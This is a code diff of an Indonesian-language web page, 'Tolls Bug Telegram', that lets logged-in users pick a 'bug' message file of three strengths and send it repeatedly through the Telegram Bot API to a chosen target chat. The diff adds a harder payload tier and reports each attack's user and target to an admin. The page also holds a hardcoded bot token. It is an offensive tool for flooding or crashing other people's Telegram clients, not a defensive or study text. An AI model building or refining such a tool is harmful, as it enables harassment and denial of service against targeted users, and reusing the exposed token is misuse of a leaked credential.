@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Bug Telegram Vinzz</title>
+  <title>Tolls Bug Telegram</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -41,16 +41,16 @@
 </head>
 <body>
   <div id="login" class="box">
-    <h2>🔐 Login</h2>
-    <input type="text" id="username" placeholder="Username"><br>
-    <input type="password" id="password" placeholder="Password"><br>
-    <button onclick="login()">Login</button>
+    <h2>🔐 𝙻𝚘𝚐𝚒𝚗...</h2>
+    <input type="text" id="username" placeholder="𝚄𝚜𝚎𝚛𝚗𝚊𝚖𝚎"><br>
+    <input type="password" id="password" placeholder="𝙿𝚊𝚜𝚜𝚠𝚘𝚛𝚍"><br>
+    <button onclick="login()">𝙻𝚘𝚐𝚒𝚗</button>
     <p id="loginStatus"></p>
   </div>
 
   <div id="dashboard" class="box">
-    <h2>🚀 Bug Telegram Vinzz</h2>
-    <input type="text" id="chatId" placeholder="ID / @username Telegram"><br>
+    <h2>🕊 𝚃𝚘𝚕𝚕𝚜 𝙱𝚞𝚐 𝚃𝚎𝚕𝚎𝚐𝚛𝚊𝚖 🕊</h2>
+    <input type="text" id="chatId" placeholder="𝙸𝙳 𝚃𝚎𝚕𝚎𝚐𝚛𝚊𝚖 𝚃𝚊𝚛𝚐𝚎𝚝"><br>
 
     <label>Jumlah Kirim:</label><br>
     <select id="jumlah">
@@ -61,15 +61,19 @@
       </script>
     </select><br>
 
-    <button onclick="kirimPesan('pesan')">𝙱𝚕𝚊𝚗𝚔 𝙼𝚎𝚍𝚒𝚞𝚖</button>
-    <button onclick="kirimPesan('pesan1')">𝙱𝚕𝚊𝚗𝚔 𝙷𝚊𝚛𝚍</button>
+    <button onclick="kirimPesan('pesan')">𝙱𝚕𝚊𝚗𝚔 𝙴𝚊𝚜𝚢</button>
+    <button onclick="kirimPesan('pesan1')">𝙱𝚕𝚊𝚗𝚔 𝙼𝚎𝚍𝚒𝚞𝚖</button>
+    <button onclick="kirimPesan('pesan2')">𝙱𝚕𝚊𝚗𝚔 𝙷𝚊𝚛𝚍</button>
 
     <p id="status"></p>
   </div>
 
   <script>
     const PASSWORDS_URL = "https://raw.githubusercontent.com/justvinzoffc/bug-telegram/main/password.json";
-    const BOT_TOKEN = "8213727800:AAGibwkPrsaMArgZmgKNtSKtZMWj1K9C4Jg"; // Ganti jika perlu
+    const BOT_TOKEN = "8213727800:AAGibwkPrsaMArgZmgKNtSKtZMWj1K9C4Jg"; // 🔁 Ganti token bot kamu
+    const ADMIN_ID = "6696150439";   // 🔁 Ganti ID admin kamu
+
+    let currentUser = "";
 
     async function login() {
       const user = document.getElementById("username").value.trim();
@@ -88,14 +92,15 @@
         const json = await res.json();
 
         if (json[user] && json[user] === pass) {
+          currentUser = user;
           status.innerText = "✅ Login berhasil!";
           document.getElementById("login").style.display = "none";
           document.getElementById("dashboard").style.display = "block";
         } else {
-          status.innerText = "❌ Username / Password salah!";
+          status.innerText = "❌ Password Tidak Ada di Database";
         }
       } catch (e) {
-        status.innerText = "❌ Tidak dapat memuat password.json!";
+        status.innerText = "❌ Password Tidak Ada di Database!!";
       }
     }
 
@@ -115,11 +120,11 @@
         const res = await fetch(urlPesan);
         pesan = await res.text();
       } catch (e) {
-        status.innerText = "❌ Gagal mengambil isi pesan!";
+        status.innerText = "❌ Error Saat Kirim Bug!!";
         return;
       }
 
-      status.innerText = "⏳ Mengirim pesan...";
+      status.innerText = "⏳ Mengirim Bug...";
 
       let total = 0;
       for (let i = 0; i < jumlah; i++) {
@@ -127,7 +132,7 @@
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
-            chat_id: chatIdInput.startsWith("@") ? chatIdInput : parseInt(chatIdInput),
+            chat_id: chatIdInput,
             text: pesan
           })
         });
@@ -139,10 +144,22 @@
         }
 
         total++;
-        await new Promise(resolve => setTimeout(resolve, 300)); // Jeda 300ms
+        await new Promise(resolve => setTimeout(resolve, 500)); // jeda 500ms
       }
 
-      status.innerText = `✅ Sukses kirim ${total} pesan ke ${chatIdInput}`;
+      status.innerText = `✅ Sukses kirim ${total} Bug ke ${chatIdInput}`;
+
+      // Kirim notifikasi ke ADMIN
+      const notif = `🔔 *LOG PENGIRIMAN*\n👤 Pengguna: *${currentUser}*\n🎯 Tujuan: *${chatIdInput}*\n📄 File: *${pesanFile}.txt*\n📦 Jumlah: *${jumlah}x*`;
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: ADMIN_ID,
+          text: notif,
+          parse_mode: "Markdown"
+        })
+      });
     }
   </script>
 </body>
